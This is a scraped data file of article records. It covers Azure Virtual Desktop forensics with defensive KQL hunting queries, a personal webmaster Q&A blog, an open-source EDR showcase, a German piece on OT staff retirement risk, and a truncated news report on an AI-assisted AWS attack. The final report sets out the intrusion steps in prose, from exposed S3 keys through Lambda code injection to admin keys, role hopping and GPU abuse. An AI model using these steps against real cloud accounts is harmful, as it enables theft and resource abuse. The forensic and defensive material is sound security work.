Pool , Application Group , and Workspace Azure resources. If an incident occurs, these logs help determine exactly what a threat actor interacted with, which is vital for assessing whether additional logs should be collected. Figure 3: Diagnostic log examples Forensic Data Collection Strategies When an incident is suspected in an AVD environment, investigators need a plan for acquiring and preserving evidence: Live vs. Offline Collection – disk and memory artifact can be captured either from a running system or from an offline snapshot. Live collection can recover volatile data like memory (RAM) but might miss user profile content when FSLogix is in use. In such cases, focus on offline acquisition by generating a snapshot of the relevant disk or file share and downloading the associated VHD. For live or offline captures, you can leverage widely used forensic tools such as Velociraptor (for remote collection across endpoints) or disk forensics tools like Autopsy to extract and analyze forensic data. Disk Snapshots – to acquire disks for offline collection and analysis, create a snapshot of the AVD Host VM disk and export it to your designated collection and analysis environment. The high-level steps are captured here . Storage account VHD Extraction – if FSLogix is enabled, user profiles are stored as VHD containers in Azure Storage. To review user data such as browser history, downloads, NTUSER.DAT, MRU lists, startup folders, and other profile artifacts you have to download the VHD that matches the username within the Azure Storage account. More about Storage account forensics can be found within Cloud forensics: Why enabling Microsoft Azure Storage Account logs matters . Figure 4: File share Artifact Analysis: What to Look for on a Host Once the user’s profile VHD and VM Host disk snapshot are acquired, analysts should focus on: Browser Data – cached web history, downloads, and session cookies can reveal malicious downloads or credential collection attempts. Threat actors frequently exploit post-breach browser access to scrape credentials, hijack sessions, or implant malicious extensions. User Registry Hives – files like NTUSER.DAT contain valuable user-specific configuration settings and MRU (Most Recently Used) lists that can reveal executed commands or opened documents. Startup Items and Temporary Directories – malicious payloads or scripts often persist by storing components in startup folders or system temp directories. These may be visible only within the user VHD if FSLogix is in use. Jump Lists and Shell Bags – these systems cache file access and folder navigation actions, offering timelines and insights into threat actoractivities. Threat Hunting in AVD Environments Threat hunting in AVD environments requires three critical dimensions: Identity, Azure platform, and host/endpoint artifact. Each layer provides unique signals and telemetry that, when correlated, help uncover malicious activity and reduce dwell time. Identity – investigate authentication patterns, privilege escalations, and anomalous sign-ins across Entra ID and related identity providers. Azure – examine control-plane operations, resource configurations, and subscription-level activities for indicators of compromise or persistence mechanisms. Host/Endpoint Artifacts – analyze session hosts for forensic traces such as browser history, file events, and registry changes that may reveal lateral movement or payload deployment. By combining insights from these components, defenders can build a threat-hunting strategy tailored for AVD’s distributed architecture. Figure 5: Threat hunting in AVD Core Hunting Objectives When hunting in AVD environments, start with three fundamental questions: Where did the threat actor log in from? – identify unusual or foreign IP addresses and devices accessing your host pools. What did they do once inside? – track actions within the session host, such as which applications were launched, commands executed, or files accessed. Where did they go next? – look for lateral movement to other resources (cloud or on-premises) and evidence of persistence (i.e., credential artifacts, backdoor accounts). These questions form the basis for iterative, hypothesis-driven hunts, allowing you to “follow the thread” and adapt as you uncover new evidence – be it new accounts, unexpected machines, or suspicious process trees. The following diagram illustrates a standard hunting process from the initial event through hunting within the entire environment and cross-domain correlation: Figure 6: Investigation Analysis Pathway Today’s security tools can make this process easier. Microsoft Sentinel combines Entra ID logs, AVD diagnostics, and MDE events into one place, so you can use KQL queries and workbooks to link related data, like joining Sign-in Logs and WVDConnections using the same user and timestamp. With MDE’s Advanced Hunting feature, you can query across endpoints; for example, you might review all AVD host devices for certain indicators or activity patterns, such as listing processes that ran during a suspected breach. The aim is to build a complete picture of the incident. Sample Hunting Queries Below are example Sentinel queries tailored to address the core hunting objectives. These should be adapted to your environment and replace dummy values with real user names, host identifiers, or IP ranges. Where did the threat actor log in from? Hunt for the suspicious user in the Entra Sign-in logs: SigninLogs | where TimeGenerated >= ago(7d) //update to reflect specific time period of interest | where UserPrincipalName has \" >\" | where AppDisplayName has \"Azure Virtual Desktop | project-reorder TimeGenerated, UserPrincipalName, AppDisplayName, ResultType, ClientAppUsed, DeviceDetail, IPAddress, UserAgent | summarize FirstDate=min(TimeGenerated), LastDate=max(TimeGenerated), count() by UserPrincipalName, AppDisplayName, ClientAppUsed, IPAddress, UserAgent Sign-in events to AVD always use the below Entra Applications. Both the application name and ID can be hunted on: Figure 7: AVD Entra Application IDs What did they do once inside? To investigate a potential security incident within AVD, it is important to review the user activity within the diagnostic logs. Therefore, we are looking next into the diagnostic logs tables WVDFeeds, WVDConnections, and WVDCheckpoints to get a better understanding of what has happened: WVDFeeds Displays the published applications that are accessible, as well as the ClientIP and ClientType information. WVDFeeds | where TimeGenerated >= ago(7d) //update to reflect specific time period of interest | where UserName has > //splitting the IP as the ClientIP is shown with port i.e. 1.1.1.1:54282 | extend ClientIP = tostring(split(ClientSideIPAddress, \":\")[0]) | summarize FirstDate = min(TimeGenerated), LastDate = max(TimeGenerated), count() by UserName, ClientOS, ClientType, ClientIP WVDConnections Displays the Client IP address, client type, connection type (Desktop or App), resource alias, and the host (from the host pool) to which the client has connected. WVDConnections | where TimeGenerated >= ago(7d) //update to reflect specific time period of interest | where UserName has > | project-reorder TimeGenerated, UserName,ClientSideIPAddress, ClientOS, ConnectionType, SessionHostName, SessionHostPoolType, State | sort by TimeGenerated asc WVDCheckpoints Determine which published application was utilized. It shows also the Operation conducted when a session was started. WVDCheckpoints | where TimeGenerated >= ago(7d) //update to reflect specific time period of interest | extend ConnectionStage = tostring(Parameters.connectionStage) | extend AppFileName = tostring(Parameters.filename) //It is only populated when it published App and not Desktop Session | extend Operation= Name | project-reorder TimeGenerated, UserName, ActivityType, Source, Operation, AppFileName, ConnectionStage Advanced Hunting in Microsoft Defender for Endpoint Now that the AVD host has been identified, you can then deep dive further by focusing on EDR and host forensic logs. If MDE Advanced Hunting is enabled, the following tables helps often to understand what happened on a system: DeviceNetworkEvents DeviceProcessEvents DeviceRegistryEvents Further tables within MDE and the Device Timeline help to get a full picture of what happened. Lateral Movement After gaining access to an AVD session host, threat actors often attempt lateral movement to expand their foothold or establish persistence. This can involve pivoting to other session hosts, Azure resources, or even on-premises systems. Focus on the following tables/log sources: Firewall logs (On premise / Cloud) DeviceNetworkEvents (Cloud: Defender) DeviceProcessEvents (Cloud: Defender) DeviceRegistryEvents (Cloud: Defender) NSG logs (Diagnostic Logs) Windows EventsLogs (Collected host logs) Best Practices for AVD Forensic Readiness The following measures enhance forensic processes for Azure Virtual Desktop: Implement an endpoint detection and response product – deploy an endpoint detection and response (EDR) solution to provide advanced detection and response capabilities on AVD VMs. Enable and export comprehensive logging – activate diagnostic logging for all host pools, workspaces, and application groups. Ensure these logs are exported to a Log Analytics workspace or a security information and event management (SIEM) platform such as Microsoft Sentinel. Develop forensic workflows for AVD – establish and document clear forensic workflows for AVD incident response. This should cover the entire process, from detecting suspicious activity, through live or offline evidence acquisition, to verifying FSLogix profile stores, exporting VHDs, and analyzing collected artifacts. Security Recommendations for Azure Virtual Desktop When implementing AVD, it is vital to follow recommended security practices. These strategies complement the best practices for forensic readiness and ensure that both proactive and reactive security measures are in place. Review Microsoft AVD Security Guidance – utilize the official Microsoft documentation for Azure Virtual Desktop security to guide your deployment and operational security policies. The resource provides up-to-date recommendations on securing your AVD environment. Enable MFA on all users – implement multi-factor authentication (MFA) for every user accessing Azure Virtual Desktop to ensure an additional layer of security beyond just passwords. Where possible, implement phish-resistant MFA for maximum protection. If full adoption isn’t practical, prioritize high-risk accounts and critical roles first. Enable Conditional Access – utilize Conditional Access policies to proactively manage and mitigate risks before granting access to your AVD environment. This helps ensure only legitimate users and trusted devices can connect to your resources. Regularly review Conditional Access policies for exceptions and minimize them wherever possible. Implement detection and alerting for any changes to CAP configurations to maintain a strong security posture. More information can be found in the following article from Microsoft - Security recommendations for Azure Virtual Desktop - Azure Virtual Desktop | Microsoft Learn Conclusion As the threat landscape evolves, cloud-hosted virtual desktops become both enablers of productivity and channels for threat actor persistence. By applying robust logging configurations, understanding the unique forensic challenges of FSLogix and AVD, and enhancing your threat hunting capabilities, you can achieve higher levels of forensic readiness. This preparedness not only accelerates investigations when incidents occur but also strengthens the overall security posture of your organization. Proactive planning today is essential to respond to tomorrow’s threats with confidence and clarity.",

    "title": "100 Webmaster Questions",
    "summary": "Here’s a blogging challenge inspired by theresmiling . “100 webmaster questions”, let’s go! 1. Please introduce yourself. I am shellsharks and shellsharks means me ! (IRL, folks call me Mike .) 2. How long have you been making websites? Since about May 2019 . 3. And what got you into the hobby? I really wanted to write this post and this post . Though my true passion for blogging and site-keeping as it is today was born when I first discovered the IndieWeb . 4. What kind of website are you most interested in? There’s a lot of sites I like . I generally adore personal / IndieWeb sites and anything that shares interesting / educational or infosec / cybersecurity content. I enjoy all sites that are particularly unique. A better question may be what sites do I not like…. Anything with AI-generated content, anything plastered with ads, most of the “corporate”-web, anything malicious and any of these other annoying sites . 5. What’s your workflow? Do you plan your websites out thoroughly or do you come up with the design as you go along? I don’t have a lot of websites outside of this one. I started in 2019 without much of a plan. I knew only that I had a few ideas for posts to write and the rest would come thereafter. If I were to make a new site today, I would have a lot of lessons learned that I could apply to how I would build said site. As it pertains to how this blog is currently set up / ran, here’s my site’s overall architecture & my blogging methodology . 6. Please link to your biggest inspirations. Here’s some of my favorite site designs , and everyone else I have to thank for how my site has turned out thus far. 7. What’s your favourite part about making websites? Great question! So hard to choose. I’ll name a few. To start, here’s some of my favorite things I’ve built for the site. But I’d say my favorite part about actually making the website has been turning it into a digital home , a place I really just like to spend time in and click around. Secondly, I’ve really enjoyed my site as a place that has helped, educated and inspired others across the ‘net. 8. And the thing you struggle with the most? Probably these two things… Finding the time and motivation to work-on / write-for the site. Getting around some of the technical limitations of static site generators. 9. Do you keep the same layout on all of your pages? Or do you use different ones? I have a few different layouts. Most of them are pretty similar but I have different layouts for different post types : posts vs. pages, there’s some special posts, etc… E.g. a page vs. a scroll vs. a note vs. a standard blog post vs. my screams etc… 10. How confident are you with CSS? Once you’ve reckoned with the horror that is CSS, can you claim confidence in anything within this reality? 11. Do you know how to correctly use ? I guess not. 12. What is your favourite HTML element? sup . I also love sts. 13. If you’re making a new web page from scratch, what is the first thing you do? If it’s for a new site, I gotta get the domain of course. Coming up with, and then actually finding the perfect domain name is really hard in my experience. Once I have my domain in hand, I try to get a wireframe up first. 14. Do you know JavaScript? Does anyone ? I know enough to get in trouble . 15. How about PHP? The basics. Nothing less. Nothing more. 16. Does your website have a theme that you stick to? Pretty much . 17. Are you more focused on content or design? Content is probably the correct answer. Though I go through stretches where I am more keenly fixated on sprucing up the site’s design / aesthetic / ux / etc… 18. Do you own a domain name? If not, would you ever want to? Yes! Many . Though shellsharks.com is probably the only one I am really using right now. 19. What do you think of nostalgia-focused or “retro” websites? Love ‘em 🧡 20. Is your HTML valid? Do you even check? Just checked this and I have 112 findings. So I guess not 😬. 21. What are your opinion on buttons and banners? Love buttons. I have a bunch of them here . Banners are ok ? I don’t like anything too visually distracting, and I certainly don’t like anything that is just an ad. 22. What do you think of button walls in particular? I think they can be done tastefully (i.e. at the bottom of the page), and there’s lots of cool buttons to show off! 23. If you started over again, would you make something similar or completely different? I’d make something similar for sure. But there’s a lot of things I would do better, or slightly different. I’d comment my site’s source code a lot more. There would be a lot less in-line JS and CSS. In fact, I might try to make it JS-free. I’d design with accessibility more in mind. Though I’m on the fence with certain features, I might use an SSG or platform that would more easily allow for me to add federation capabilities, webmentions, and other IndieWeb functionality. I have a lot of other ideas I might incorporate from the beginning too. 24. Are you envious of other people’s websites? I wouldn’t say that, no. There are a lot of websites that I think are really cool though. They inspire me. Sometimes I steal good ideas when I see them. But I really like my website. I think it is unique, and in its sum, the best. It feels like home . 25. What text editor do you use? Visual Studio Code. 26. Why do you use that one? It’s cross-platform, I’m familiar with it, it has the Git functionality I want. I’m not super attached to it. But just haven’t tried other things. 27. Do you host your image files on your web server, or on another host? Some of my images are in my GitHub repo, but most of them are in an AWS S3 bucket. 28. This might not be relevant to you, but what’s your opinion on the Neocities vs. Nekoweb debate? Not aware of the debate. So no opinion. 29. How much server space would you estimate your main website takes up? Not sure. I suppose I don’t really care. 30. Do you keep local backups of your files? Yep! 31. Do you prefer simple or highly visual websites? I see the beauty and merit in both. But have you seen my site? Very info-dense. 32. Do you stick to certain colours? Do you do that on purpose, or is it your subconscious? I have some thematic colors to be sure, but I also have different themes (e.g. light/dark/classic) you can toggle through depending on your preference or mood. 33. Have you ever thought about quitting? Why? The site? No. I go through drought periods where I am less active, but I’ve never considered shutting the site off or completely walking away. The nice thing about a personal website is you can be as active, or inactive as you want and come back when you please. 34. Do you have many webmaster friends, or is it a solitary hobby? There are a lot of people I have met online in the IndieWeb community and via the Fediverse that have their own sites. We are friendly in a digital kinda way. IRL though I don’t know too many folks who have personal websites. 35. Do people in your real life know about your website? They sure do. 36. Do you update your website very often? How often is “very often”? I’d say my site is updated very frequently most of the time . These updates are typically small additions to some of the lists that I keep. When I am very active with the site you might also see multiple net new posts in a week. 37. And the overall design, do you change that much? Why or why not? I’ve gone through a major design overhaul about every 2 years thus far. 38. Is your website more you-focused, hobby-focused, or outside world-focused? It’s a bit of everything. I write about infosec , technology and “ life in general”. I’ve given myself the space to write about whatever I want, from my professional pursuits to my personal life , and everything in between. 39. Do you do web design professionally? Not at all. 40. If not, would you like to? And if you’re comfortable answering, what do you do for work? At one point in time that was my dream. To work remotely + abroad and do web design / web building work. I never really went down that path in the end, opting instead for the cybersecurity field. 41. Do you communicate with people by email very much? Occassionally. I do enjoy email correspondence, and try to contact IndieWeb folks from time to time via email just to chat. 42. Some people reject social media and use websites as a replacement. Do you keep social media outside of your website? In a way, yes. My site isn’t “social”, in that it is not federated, it doesn’t support webmentions and there is no commenting system. I like what is on my site to be my content alone. But I write about social media a lot, link out to my social presences and even PESOS some social media content back into my site. 43. How about instant messengers? Do you use a mainstream one like Discord or Telegram? Or something like Matrix? Do you avoid them? I do use them, but they don’t see much action day-to-day. I have and use Discord , Matrix and XMPP (shellsharks@xmpp.earth). I also have lots of traditional “text messaging”-type apps I use (e.g. Google Voice, WhatsApp, iMessage, etc…) 44. Do you listen to music while you work on websites? If so, what kinds of artists? Sometimes . Just depends on my mood and what I’m doing. For some reason I can listen to music while reading, but not when I’m writing. I can listen to music while I code though. In these cases, I’ll mostly listen to instrumental versions of albums I like and metal. 45. Do you keep everything you make on one website, or do you have more than one? Monolithic. 46. On a similar note, do you keep to one topic on your site, or many? Any and all topics. 47. Do you present your real self, or at least try? Or do you construct a persona on purpose? I pride myself on being genuine , both in my writing and in person. 48. Have you ever made a good friend thanks to your website? Eh , I don’t know about that. But I have built a lot of cool relationships thanks to my site. So that’s neat! 49. Are you happy with the way HTML and CSS currently work? I like the design and functionality of my site. But there’s A LOT I want to improve, some of which I need time to do, and in other cases I need to learn how to do it. 50. What are practices that you think people should avoid? All these things . 😡 51. What about under-utilised practices, or things you think people should do more? I don’t know if these are under-utilized per say, but here’s a bunch of things I recommend for folks to do while they are site building. 52. Do you use a lot of semantic HTML? Or are you guilty of generic structure? I discovered the concept of semantic HTML somewhat recently, and certainly after the first few iterations of my site’s overall design. I’ve incorporated some semantic HTML since then, but it hasn’t yet permeated the entirety of the site’s bones. 53. Do you consider different browsers? Consider ? I use Chrome and Safari mostly. 54. Speaking of, what’s your preferred browser? Convince your readers why they should use it. I use Safari on my personal computer and Chrome on the professional side. 55. And what OS are you on? macOS. 56. Do you have a strong opinion on that, or do you just happen to use it? I’m not a zealot or anything, but I love Mac and am not interested in anything else. Also, have you seen Windows lately? Complete dumpster fire. Aspirationally, I’d like to become a Linux user but in my few attempts to switch over I just haven’t found traction. 57. Are your websites mobile-friendly? I think so. I’ve tried to make it so and done some testing. I have special mobile layouts too. 58. What are your thoughts on autoplay? Don’t like. 59. What are your thoughts on webrings? Are you in any? Love webrings! I’m in a bunch ! 60. Do you have any web shrines? What do you like to see in that sort of page? I’ve never considered any of my pages/posts a “web shrine”. But I do have some things maybe you could consider shrine-ey ? The Shellsharks Logo Chronicles Shellsharks Doodles 61. Are your websites “cliche”, in your opinion? Nah. 62. What is your ideal website? Are you striving for that, or for something else? Hmm … I’d say the “ideal” website has… Unique design / some unique characteristics. Whimsy A mix of content types (e.g. personal journals, niche/technical posts, link dumps, etc…) Search capability As much of this stuff as you can throw in My site has these things and is ideal for me. 63. Are you an artist? Do you draw or design your own assets? Oh absolutely . Is it good art? Well, I’ll let you be the judge of that . 64. What are your favourite resource sites? Not sure what this question means exactly. But I have a lot of IndieWeb resources I keep listed here . 65. Is there a habit you just can’t get away from no matter how hard you try? Here’s a bunch of my writing mannerisms , some of which I try to get away from and others that are just unique to how I go about things. 66. What’s your biggest advice for a new webmaster? Don’t worry about doing everything, or being perfect. Just add things little by little. Be yourself . 67. Do you keep all your styling in CSS? Or do you hard-code some? Some of it is tucked away in CSS files, and unfortunately too much of it is still in-line. 68. What do you think of frameset layouts? Don’t know much about ‘em. 69. How about table-based layouts? Don’t know much about these either. I use a CSS grid kinda thing. 70. Do you subscribe to the ideas of “one-column”, “two-column” and “three-column” layouts? Do you use any of these? Yes I like and use these in certain situations. My mobile layout is exclusively single-column. But as the device size gets bigger, you will see content start to spread across multiple columns, especially as it pertains to my home page . I like the idea of ToC’s and sidenotes populating side columns for post content too (though I haven’t gotten around to implementing this sort of thing yet). 71. Do you spend longer on the HTML or the CSS? No idea. Probably the CSS though because it’s maddening. 72. Have you ever made a page with no CSS? It’s useful for your thoughts. I have a number of .txt pages if that counts (e.g. humans.txt ). Most of my site is styled though. 73. Do you ever find yourself making layouts with nothing to put on them? Or do you only make layouts when the need arises? Don’t think I’ve ever made a layout I didn’t have something already in mind for. 74. Would you consider yourself a beginner? Or advanced? Somewhere in the middle? In terms of having a site in-general, I’d say I’m upper-intermediate at this point. There are some aspects of site design / webmastering / site-building that I am still not so good at to be honest. 75. Do you have a habit of looking at the source code of websites you visit? I wouldn’t say it’s a habit. But I do do it on occasion. It’s a good thing to do . 76. How did YOU learn how to make websites? A long time ago I learned the old fashioned way, hand-jamming HTML tags directly into a notepad plaintext file. But in terms of my current site, I’ve learned kinda on-the-go. A mix of reading official documentation, W3schools, stack overflow, etc… 77. Do you ever force elements to do things they’re not supposed to? Not sure. But I do use plenty of outdated HTML elements 😅. 78. Thoughts on floating elements? Floating how? Like CSS floating things in one direction or not in a container? Or visually “floating” on page? Not sure how to answer this one. 79. When you’re sizing stuff, what do you use first? Do you use px, em, %, or something else? Whatever works. All of the above. 80. Do you have a favourite font? Not really. Maybe something in the Helvetica family? 81. Would you run a website with another person? How would that work? Sure , for a project or something that we had a mutual interest in. 82. Do you surf the Web to find new personal websites very often? Sometimes I’m very active in my surfing/exploring. Other times I’m not. My infosec sites , Scrolls and Linklog are a few examples of the product of this surfing though. 83. Do you bookmark other people’s websites? How would you feel knowing someone else bookmarked yours? Yep ! I bookmark them, subscribe via RSS , add to specific lists, etc… I love seeing when other people bookmark, reference, or add my site to theirs in some way too! 84. What do you want people to be most impressed with when they see your website? Maybe these things ? 85. Are you interested in technology outside of websites? Do you collect? Yep. I’ve always been into Apple, desk setups, infosec, computing-in-general, that sorta thing. Can’t say I really have any tech-related collections. 86. How often and for how long are you online? Too much . Basically all day except for when I’m at the gym, sleeping, or spending time with the family. 87. When it comes to your website, who is your target audience? Everyone . I write about infosec, technology and life-in-general. 88. Have you ever been interested in XHTML? Not specifically, no. 89. Do you program in general? Have you ever written a program for use with or on your website, not counting simple JavaScript? I don’t have any “programs” on my site (unless you count some shoddy JS code as a “program”). I can program, but mostly have simple JS and Liquid stuff on the site. 90. Speaking of programs that help you make websites, what do you think of static site generators (SSGs)? Have you ever used one? Yes. Love! I use Jekyll . 🧡 91. Do you keep a hitcounter? Why or why not? No. Don’t care. I’m more interested in people directly messaging me. 92. Do you frequent forums? Which ones? Not THAT frequently. But I am a patron of infosec.pub and 32-Bit Cafe . 93. Do you write your page content directly into the editor, or do you prepare it elsewhere, like a text document or a Word document? I use VSCode and git. Here’s some other how-I-do-things-related docs… Site Architecture Blogging from my iPad Get to know my blog 94. Do you think you appear cool to others? A more accurate answer now: do other people ever say you’re cool? I’m sure there’s someone out there who thinks the things I do are cool. Or maybe it’s just me. 95. Are you embarrassed of your old work? Have you ever deleted everything out of shame? Nah . If there is any of my old work that I don’t like though I tend to update it, so that keeps the embarassing stuff to a minimum. 96. Would you close down your website if you couldn’t update it, or would you leave an archive? I’d like to have my site available indefinitely . 97. Do you reveal a lot about yourself on your website? Or are you more secretive? I’m relatively open book. I don’t put a lot of pictures of myself but I do post a fair bit about what I’m up to personally . 98. Are you willing to reveal who your best online friend is, and/or if they have a website? I don’t think I have an online-specific “best friend”. I’ve started to build some friendlier online relationships thanks to projects like Scrolls though. 99. And do you optimise the images on your website? I don’t really. Most of my images are stored in an S3 bucket and pulled in from there. 100. We’re out of time! How do you feel after answering 100 questions? ….other than exhausted. It’s a lot! But once you get in the groove of things you can answer 100 questions pretty quickly.",

    "title": "I built an open-source EDR that maps 216 MITRE ATT&CK techniques (Next.js + Python/PyTorch) - Roast my work!",
    "summary": "Hi everyone, I'm a developer from India, and for the last 3 months, I've been building PCDS (Predictive Cyber Defense System). I realized most Enterprise EDR tools (CrowdStrike, SentinelOne) are way too expensive for SMBs and impossibly complex to set up. I wanted to build something that bridges the gap: Enterprise-grade detection with consumer-grade UX. 👇 The Tech Stack: Frontend: Next.js 14 (App Router) + Tailwind + Three.js for network viz. Backend: FastAPI (Python) with WebSocket streaming. Detection Engine: PyTorch LSTM models trained on the CIC-IDS2017 dataset (99.7% accuracy during testing). Agent: Rust/Python hybrid for low-overhead monitoring. 🔥 Features: 3D Network Topology: Visualizes traffic flow and highlights infected nodes in real-time. MITRE Mapping: Automatically maps alerts to 216 distinct ATT&CK techniques (e.g., T1059 Command & Scripting). \"Kill Switch\": Automated playbook to terminate processes that show ransomware behavior (Shadow Copy deletion, high entropy writes). The \"Cool\" Part: I just shipped a huge UI update to make it look less like an Excel sheet and more like a \"Cyber Command Center\". It uses CRT scanlines, glitch effects, and holographic cards (maybe too much? let me know). I need your feedback: I'm looking for harsh feedback. Is the UI too \"gamery\"? Is the MITRE mapping useful or just noise? 🔗 Live Demo: https://pcdsai.app/ (It's a read-only demo instance) 💻 GitHub: https://github.com/SANJAY31105/pcds-core Thanks for checking it out!

    "title": "Cyberrisiko Ruhestand",
    "summary": "Wenn OT-Fachkräfte in den Ruhestand gehen, droht ein massiver Wissensverlust. Das kann erhebliche Folgen für die Cybersicherheit haben. vectorfusionart – shutterstock.com Zwar stellen Cyberkriminelle und staatlich unterstützte Angreifer gerade für den Industriesektor eine enorme und steigende Gefahr dar. Dennoch besteht die größte Bedrohung derzeit im mangelnden Wissenstransfer, was OT-Sicherheit und -Organisation (Operational Technology) angeht. Das Hauptproblem sind vertrauenswürdige Mitarbeiter, die in Rente gehen. Diese Personen sind in der Regel engagiert, sachkundig und unersetzlich. Sie wissen, auf welchem unbeschrifteten Server das System zur Erfassung historischer Daten läuft, das die Aufsichtsbehörden verlangen. Sie erinnern sich daran, warum ein bestimmtes VLAN mit scheinbar zufälligen IP-Adressen konfiguriert wurde. Sie wissen, welche Netzwerkrouten nur unter Produktionsstillstand geändert werden können. Ihr institutionelles Wissen umfasst somit Tausende von IP-Adressen, undokumentierte Netzwerkrouten und versteckte VLANs, die in der offiziellen Dokumentation fehlen. Ihre Nachfolger hingegen bringen Erwartungen an moderne, gut dokumentierte Netzwerkarchitekturen mit. Stattdessen erben sie ein komplexes Geflecht aus Altsystemen, proprietären Protokollen und undokumentierten Konfigurationen, die das Ergebnis jahrzehntelanger schrittweiser Änderungen und Notfallkorrekturen sind. Die Diskrepanz zwischen Erwartungen und Realität führt zu einer Wissenslücke, die sowohl die Betriebskontinuität als auch die Cybersicherheit gefährdet. Hierbei handelt es sich jedoch um eine Art „Single Point of Failure“, den die meisten Unternehmen erst erkennen, wenn es bereits zu spät ist. Der Weggang erfahrener OT-Fachkräfte birgt drei kritische Risiken, die weit über einfache Personalprobleme hinausgehen und bei herkömmlichen Risikobewertungen meist unterschätzt werden: 1. Systemausfälle während der Modernisierung Das unmittelbare und schwerwiegendste Risiko besteht in unbeabsichtigten Folgen während System-Upgrades oder Modernisierungsmaßnahmen. Ältere OT-Netzwerke enthalten das, was Branchenexperten als „archäologische Schichten“ bezeichnen: Jahrzehntelange inkrementelle Modifikationen, Notfallkorrekturen und undokumentierte Konfigurationen, die versteckte Abhängigkeiten schaffen. Die größten Risiken: Nicht dokumentierte Altsysteme : Die meisten Produktionsstätten verfügen über mindestens ein Windows-NT- oder Windows-XP-System, auf dem unverzichtbare historische Daten gespeichert sind oder zentrale Prozesse gesteuert werden. Diese Systeme sind oft nicht hinreichend dokumentiert. Ihre Entfernung im Zuge von Modernisierungsmaßnahmen kann zum Verlust der Produktionsdaten von Jahrzehnten führen, die für die Einhaltung gesetzlicher Vorgaben erforderlich sind. Versteckte Netzwerkabhängigkeiten : IP-Routing-Tabellen, VLAN-Konfigurationen und Firewall-Regeln enthalten oft scheinbar willkürliche Einstellungen, die jedoch tatsächlich Netzwerkkonflikte verhindern oder die Kommunikation kritischer Systeme aufrechterhalten. Eine Änderung dieser Konfigurationen ohne institutionelles Wissen kann zu einem Dominoeffekt über mehrere Produktionslinien hinweg führen. Anforderungen an proprietäre Protokolle : Viele ältere Industriesysteme kommunizieren über proprietäre oder modifizierte Standardprotokolle. Die spezifischen Konfigurationsparameter, die diese Kommunikation ermöglichen, sind selten dokumentiert und existieren nur im institutionellen Wissen ausscheidender Mitarbeiter. Lesetipp: CISOs müssen OT-Risiken stärker adressieren 2. Verlängerte Time-to-Value für neue Geräte und Prozesse Der Verlust von spezifischem Know-how verlängert die Implementierungszeiten für neue Geräte, Prozessverbesserungen und Systemintegrationen erheblich. Dieser Effekt verstärkt sich mit der Zeit und führt zu Wettbewerbsnachteilen und verpassten Optimierungsmöglichkeiten. Herausforderungen bei der Implementierung: Komplexe Netzwerkintegration : Die Installation neuer Geräte, die früher nur wenige Tage dauerte, nimmt nun Wochen oder Monate in Anspruch. Der Grund: Die neuen Mitarbeitenden müssen die bestehenden Netzwerkkonfigurationen zunächst zurückentwickeln, um die Kompatibilität sicherzustellen. Ineffiziente Fehlerbehebung : Wenn Integrationsprobleme auftreten, müssen unerfahrene Mitarbeitende häufig Trial-and-Error-Ansätze anwenden, anstatt auf historische Kenntnisse ähnlicher Probleme und deren Lösungen zurückgreifen zu können. Abhängigkeit von Anbietern : Unternehmen sind zunehmend auf externe Systemintegratoren und Gerätehersteller angewiesen, um ihre eigenen Netzwerke zu verwalten. Das erhöht die Projektkosten und -laufzeiten erheblich. 3. Unbeabsichtigte Cybersicherheitslücken Ein verstecktes Risiko liegt in gut gemeinten Verbesserungen der Cybersicherheit, die tatsächlich die Angriffsfläche vergrößern. Das neue Personal, das in modernen IT-Sicherheitspraktiken geschult ist, implementiert häufig Lösungen, die für OT-Umgebungen ungeeignet sind oder unbeabsichtigt zuvor isolierte Systeme offenlegen. Häufige Muster für die Schaffung von Schwachstellen: Fehlerhafte Netzwerksegmentierung : Versuche, eine moderne Trennung in Netzwerksegmente zu implementieren, verbinden versehentlich zuvor isolierte Netzwerkteile miteinander. So entstehen neue Angriffspfade, die in der alten Konfiguration nicht existierten. Fehlkonfigurationen von Firewalls : Durch mangelnde Kenntnisse von Legacy-Protokollen können moderne Firewall-Implementierungen legitime industrielle Kommunikationen blockieren und gleichzeitig unbefugte Zugriffe nicht verhindern. Diese drei Hauptrisiken verstärken sich gegenseitig, wenn sie gleichzeitig auftreten. Dies ist immer häufiger der Fall, da Unternehmen versuchen, veraltete Infrastrukturen zu modernisieren und gleichzeitig den Wandel in der Belegschaft zu bewältigen.

    "title": "From credentials to cloud admin in 8 minutes: AI supercharges AWS attack chain",
    "summary": "Threat actors tore through an Amazon Web Services environment in under eight minutes, chaining together credential theft, privilege escalation, lateral movement, and GPU resource abuse with the help of large language models, an attack so fast that defenders had virtually no time to react. According to new findings from Sysdig’s Threat Research Team, the intruders turned a single exposed credential in a public S3 bucket into full administrative control, demonstrating how AI‑assisted automation has collapsed the cloud attack lifecycle from hours to mere minutes. The operation, observed in November 2025, reportedly combined a cloud misconfiguration with large language models (LLMs) to compress the entire attack lifecycle. “The cybersecurity world today is brand new,” said Ram Varadarajan, CEO at Acalvio. “In this threat environment, organizations have to accept that the speed of the breach has shifted from days to minutes. Autonomous intruders can now escalate from initial access to full administrative control in minutes.” Defending against this class of attacks, he added, demands “AI-focused technology” that can reason and respond at the same speed as automated attackers.” Public Buckets to privilege escalation in minutes The compromise began with valid AWS credentials left exposed in public S3 buckets. Those buckets contained AI-related data, and the associated IAM user had permissions to interact with Lambda and limited access to Amazon Bedrock. “This user was likely intentionally created by the victim organization to automate Bedrock tasks with Lambda functions across the environment,” Sysdig researchers said in a blog post shared with CSO ahead of its publication on Tuesday. With read access across the environment, the attacker rapidly enumerated AWS services, then escalated privileges by modifying an existing Lambda function. By injecting malicious code into a function that already had an overly permissive execution role, the attacker was able to create new access keys for an administrative user and retrieve them directly from the Lambda execution output. Jason Soroko, senior fellow at Sectigo, said the root cause was depressingly familiar. “We must look past the novelty of AI assistance to recognize the mundane error that enabled it,” he said. “The entire compromise began because the victim left valid credentials exposed in public S3 buckets . This failure represents a stubborn refusal to master security fundamentals.” The Lambda code showed signs of LLM generation, including comprehensive exception handling, iterative targeting logic, and even non-English comments. Lateral movement, LLMjacking, and GPU abuse Once administrative access was obtained, the attacker moved laterally across 19 distinct AWS principals , assuming multiple roles and creating new users to spread activity across identities. This approach enabled persistence and complicated detection, the researchers noted. The attackers then shifted focus to Amazon Bedrock, enumerating available models and confirming that model invocation logging was disabled. The researchers said multiple foundation models were invoked, a pattern consistent with “ LLMjacking ”. Then, the operation escalated into resource abuse. After preparing keys and security groups, the attackers attempted to initiate high-end GPU instances for machine learning workloads. While most powerful instances failed due to capacity limits, a costly GPU instance was eventually launched, with scripts to install CUDA , deploy training frameworks, and expose a public JupyterLab interface. Some of the code was found referencing nonexistent repositories and resources, which Sysdig researchers 